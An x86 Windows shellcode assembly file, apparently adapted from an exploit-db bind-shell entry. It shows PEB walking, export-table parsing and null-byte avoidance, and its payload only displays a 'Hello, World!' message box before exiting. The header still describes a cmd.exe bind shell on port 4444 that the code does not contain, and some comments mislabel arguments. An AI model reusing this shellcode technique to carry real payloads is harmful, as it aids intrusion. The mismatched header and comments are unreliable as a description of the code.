; Taken from https://www.exploit-db.com/exploits/47980
; Compile with:
; nasm -f win32 shellcode.asm -o shellcode.o
; objcopy -I elf32-little -j .text -O binary shellcode.o shellcode.bin

# Shellcode Title: Windows/x86 - Dynamic Bind Shell + Null-Free Shellcode (571 Bytes)
# Shellcode Author: Bobby Cooke
# Date: 2020-01-30
# Technique: PEB & Export Directory Table
# Tested On: Windows 10 Pro (x86) 10.0.18363 Build 18363
# Shellcode Function: When executed, this shellcode creates a cmd.exe bind shell, using the CreateProcessA function on TCP port 4444, on all IP interfaces.
# Reason for Creating: When learning x86 Windows Dynamic Shellcoding, I experienced great difficulty in finding a detailed bind shell example to learn from. Their are many great examples for creating dynamic MessageBox shellcode, dynamic bind shellcode for x86 Linux, and many examples of Windows version dependent shellcode; with hardcoded library addresses. Metasploit has a great, compact, reliable, dynamic Windows x86 bind shellcode, but trying to reverse engineer it, to learn, is no small task. MetaSploits payload is great because it uses the best known shellcoding shortcut techniques. Unfortunately for the Security Researcher new to x86 Windows Shellcoding these shortcuts are very advanced concepts to take on right from the start. Hopefully this horribly large shellcode will help someone learn x86 Dynamic Windows shellcoding easier than the path I took.
# Special Thanks & Credits to: Skape, 0xDarkVortex/paranoidninja, Corelan, Offensive Security, Vivek & Pentester Academy, Tulpa, sh3llc0d3r

# Create a new stack frame
 push ebp                ; push current base pointer to the stack
 mov ebp, esp            ; Set Base Stack Pointer for new Stack-Frame
 sub esp, 0x60           ; Decrement the stack by 96 to create space for saving pointers 

# Push string "GetProcAddress",0x00 onto the stack
 xor eax, eax            ; clear eax register
 mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
 push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"      
 push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
 push 0x41636f72         ; Acor : 41636f72
 push 0x50746547         ; PteG : 50746547
 mov [ebp-0x4], esp      ; save PTR to string at bottom of stack (ebp)

# Find Base Address of the kernel32.dll Dynamically Linked Library
; - In Windows, the FS Segment Register will always point to the Thread Environment Block (TEB).
; - This shellcode is dynamic & does not rely on any hardcoded addresses.
;   - The addresses in the comments are used as an example and will be different for you.
; - The easiest way to get the WinDbg commands to work is to connect to the Windows Symbol Server.
; - On new versions of Windows, kernel32.dll is the 3rd dll in the Initialization Order Module List.
;   - On older versions of Windows, kernel32.dll was the 2nd dll. Now the 2nd dll is kernelbase.dll.
;     - Interestingly kernelbase.dll also has functions like LoadLibraryA & GetProcAddress.
;     - kernelbase.dll can be used instead of kernel32.dll sometimes, but we will stick with kernel32.dll.
 xor eax, eax            ; clear eax register
 mov eax, [fs:eax+0x30]  ; #1| Get PEB Address from within the TEB; leveraging the FS Register.
                         ; WinDbg> !teb
                         ;  TEB at 002e9000
                         ; WinDbg> dt nt!_TEB 002e9000
                         ;  +0x030 ProccessEnviromentBlock: 0x002e8000 _PEB 
                         ; EAX = 0x002e8000 (Address_of_PEB)
 mov eax, [eax+0xc]      ; #2| Get the LDR Address from within the PEB.
                         ; WinDbg> dt nt!_PEB 002e8000 
                         ;  +0x00c Ldr : 0x77becb80 _PEB_LDR_DATA
                         ; EAX = 0x77becb80 (Address_of_LDR)
 mov eax, [eax+0x1c]     ; #3| Get the first entry in the Initialization Order Module List (ntdll.dll)
                         ; WinDbg> dt nt!_PEB_LDR_DATA 0x77becb80 
                         ;  +0x01c InInitializationOrderModuleList : _LIST_ENTRY
                         ; WinDbg> db 0x77becb80+1c
                         ;  77becb9c  90 1d 5f 00  // First Entry is 0x005f1d90 (reverse for Little Endian)
                         ; WinDbg> db 0x5f1d90
                         ;           #00#01#02#03#04#05#06#07#08#09#0a#0b
                         ;  005f1d90  38 26 5f 00 9c cb be 77-00 00 ad 77
                         ;  - we see that 0x5f1d90+0x8 is the base address of ntdll.dll - 0x77ad0000
                         ;    - ModLoad: 77ad0000 ntdll.dll
                         ;  - We also see that the next entry in the list is at 0x005f2638
                         ; EAX = 0x005f1d90 (First Entry of InInitialzationOrderModuleList - ntdll.dll)
                         ; #4| Get the second entry in the Initialization Order Module List (kernelbase.dll)
 mov ebx, eax            ; - Should be 'mov eax, [eax]', but the opcode contains a null byte 8B00
 mov eax, [ebx]          ;   - Avoid null byte
                         ; WinDbg> dt nt!_LIST_ENTRY 0x5f1d90
                         ;   +0x000 Flink            : 0x005f2638 _LIST_ENTRY
                         ; WinDbg> db 0x005f2638
                         ;  005f2638  78 22 5f 00 90 1d 5f 00-00 00 56 75 
                         ; - We see that 0x005f2638+0x8 is the base address of kernelbase.dll - 0x75560000
                         ;   - ModLoad: 75560000 C:\Windows\System32\KERNELBASE.dll
                         ;  - We also see that the next entry in the list is at 0x005f2278
                         ; EAX = 0x005f2638 (Second Entry of InInitialzationOrderModuleList - kernelbase.dll)
                         ; #5| Get the third entry in the Initialization Order Module List (kernel32.dll)
 mov ebx, eax            ; - Should be 'mov eax, [eax]', but the opcode contains a null byte 8B00
 mov eax, [ebx]          ;   - Avoid null byte
                         ; WinDbg> dt nt!_LIST_ENTRY 0x005f2638
                         ;  +0x000 Flink            : 0x005f2278 _LIST_ENTRY
                         ; WinDbg> db 0x005f2278
                         ; 005f2278  9c cb be 77 38 26 5f 00-00 00 22 76 
                         ; - We see that 0x005f2278+0x8 is the base address of kernel32.dll - 0x76220000
                         ;   - ModLoad: 76220000 C:\Windows\System32\KERNEL32.DLL
                         ; EAX = 0x005f2278 (Third Entry of InInitialzationOrderModuleList - kernel32.dll)
 mov eax, [eax+0x8]      ; move the kernel32.dll base address into the EAX register
                         ; EAX = 0x76220000 (Base address of kernel32.dll)
 mov [ebp-0x8], eax      ; Save the base address of kernel32.dll in the 2nd from bottom position on our stack

# Find Base Address of GetProcAddress Symbol
; - Now that we have the base address of kernel32.dll, we will use it to find the address for the Symbol(function) GetProcAddress.
;   - GetProcAddress() will then be used to find the addresses of all other Symbols(functions) that we need.
;   - The Export Table technique is used to find the address of GetProcAddress (as detailed in Skapes Windows Shellcoding Paper).
 mov ebx, [eax+0x3c]     ; save Relative Virtual Address (RVA/Offset) of New_Exe_Header to ebx.
                         ;  WinDbg> db 0x76220000+3c
                         ;   7622003c  f8 00 00 00  // EBX = 0x000000f8 = Offset to New EXE Header
 add ebx, eax            ; (kernel32.dll baseAddr) + (RVA New_Exe_Header) = Address of New_Exe_Header
                         ;        0x76220000       +        0xf8          =       0x762200f8 
                         ; EBX =  0x762200f8 (Address of new  Header)
 mov ebx, [ebx+0x78]     ; (RVA of New Exe Header) + 0x78 = RVA of Export-Table
                         ; WinDbg> db 0x762200f8+0x78
                         ;  76220170  b0 77 07 00   // EBX = 0x000777b0
 add ebx, eax            ; (kernel32.dll baseAddr) + (RVA Export-Table) = Address of Export-Table
                         ;        0x76220000       +    0x000777b0        =       0x762977b0  
                         ; EBX now holds the address of the Export Table for kernel32.dll (0x762977b0)
 mov edi, [ebx+0x20]     ; PTR to RVA of Name-Pointer Table
                         ; WinDbg> db 0x762977b0+0x20
                         ;  762977d0  e0 90 07 00   // EDI = 0x000790e0
 add edi, eax            ; (kernel32.dll baseAddr) + (RVA Name-Pointer Table) = Address of Name-Pointer Table
                         ;        0x76220000       +    0x000790e0        =       0x762990e0  
 mov [ebp-0xC], edi      ; save Address of Name-Pointer Table in the 3rd from bottom position in our stack-frame
 mov ecx, [ebx+0x24]     ; PTR to RVA of Ordinal Table
 add ecx, eax            ; (kernel32.dll baseAddr) + (RVA Ordinal Table) = Address of Ordinal Table
 mov [ebp-0x10], ecx     ; save PTR to Ordinal Table Address at 4th from bottom of stack (ebp-16)

 mov edx, [ebx+0x1c]     ; PTR to RVA of Address Table
 add edx, eax            ; (kernel32.dll baseAddr) + (RVA Address Table) = Address of Address Table
 mov [ebp-0x14], edx     ; save PTR to Address Table Address at 5th from bottom of stack (ebp-20)

 mov edx, [ebx+0x14]     ; Value of Number of Functions/Symbols within the Tables

 xor eax, eax            ; Counter = 0

loop:
 mov edi, [ebp-0xC]      ; Address of the Name-Pointer Table
 mov esi, [ebp-0x4]      ; PTR to string "GetProcAddress",0x00
 xor ecx, ecx            ; clear ecx register -- used for counters/loops
 cld                     ; clear direction flag, DF=0 -- Process strings from left to right
 mov edi, [edi+eax*4]    ; Entries in Name Pointer Table are 4 bytes long
                         ; edi = RVA of Nth entry = (Address of Name-Pointer Table) + (Counter * 4)
 add edi, [ebp-0x8]      ; edi = address of string = (kernel32.dll base addr) + (RVA of Nth entry)
 add cx, 0xf             ; ecx = length of string to compare = sizeof("GetProcAddress") = 15 (14 Letters + 1 String Terminator Char)
 repe cmpsb              ; compare first 15 bytes of string. esi cmp edi
                         ; if equal ZF=1, if not ZF=0
 jz found                ; if strings match end loop, else increment eax and loop again
 inc eax                 ; counter ++
 cmp eax, edx            ; check if eax = Value of Number of Functions/Symbols within the Tables
 jb loop                 ; If eax != edx, restart the loop

found:
; The Counter (eax) now holds the poisition of GetProcAddress within the table
 mov ecx, [ebp-0x10]     ; ecx = Address of Ordinal Table
 mov edx, [ebp-0x14]     ; edx = Address of Address Table
 mov ax, [ecx + eax*2]   ; ax = ordinal number = (Address of Ordinal Table) + (counter * 2)
 mov eax, [edx + eax*4]  ; eax = RVA of function = var20 + (ordinal * 4)
 add eax, [ebp-0x8]      ; eax = address of GetProcAddress = (RVA of GetProcAddress) + (kernel32.dll base addr)
;   Address of GetProcAddress is now in EAX
 mov [ebp-0x18], eax     ; save Address of GetProcAddress onto Stack 0x18=24; 6th from bottom

; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
; Call GetProcAddress(hModule, lpProcName)
;   hModule:    address of the DLL module that contains the function.
;   lpProcName: A Pointer to the beginning of an ASCII string of the functions name; null terminated.
 xor edx, edx            ; EDX = 0x00000000
 push edx                ; null terminator for LoadLibraryA string
 push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
 push 0x7262694c         ; rbiL : 7262694c
 push 0x64616f4c         ; daoL : 64616f4c
 push esp                ; $hModule    -- push the address of the start of the string onto the stack
 push dword [ebp-0x8]    ; $lpProcName -- push base address of kernel32.dll to the stack
 mov eax, [ebp-0x18]     ; Move the address of GetProcAddress into the EAX register
 call eax                ; Call the GetProcAddress Function.
                         ; The address of the queried function is returned into the EAX register.
 mov [ebp-0x1c], eax     ; save Address of LoadLibraryA onto Stack 0x1c=28; 7th from bottom

;---------------------------

;LoadLibraryA("user32.dll")
xor ecx,ecx
push 0x42426c6c
mov [esp+2],byte cl
push 0x642e3233
push 0x72657375
push esp

mov ebx, [ebp-0x1c]     ; LoadLibraryA Address to ebx register
call ebx                ; call the LoadLibraryA Function to load user32.dll
mov [ebp-0x20], eax     ; save Address of user32.dll onto Stack at 0x20=32; 8th from bottom

;-------------------------

;Finding address of MessageBoxA()
add esp,12
xor ecx,ecx
push 0x4241786f
mov [esp+3],byte cl
push 0x42656761
push 0x7373654d

push esp
push eax

mov ebx, [ebp-0x18]
call ebx ; GetProcAddress(&user32, "MessageBoxA")

;----------------
;MessageBoxA(NULL,"Hello, World!","Test",1)

xor edx,edx
xor ecx,ecx


mov dl, 0x21
push edx
push 0x646c726f
push 0x57202c6f
push 0x6c6c6548

lea edx,[esp] ; "Hello, World!"

push ecx
push 0x74736554

lea ecx,[esp] ; "Test"

xor ebx,ebx

push ebx
push ecx
push edx
xor ebx,ebx
push ebx

call eax ; Call MessageBoxA


;----------------------
; Find address of ExitProcess
xor ecx,ecx
push 0x41737365
mov [esp+3],byte cl
push 0x636f7250
push 0x74697845


lea ecx,[esp]


push ecx
push dword [ebp-0x8]

mov ebx, [ebp-0x18]
call ebx ; GetProcAddress(&kernel32, "ExitProcess")

;---------------
xor ecx,ecx
push ecx
call eax ; ExitProcess(0)
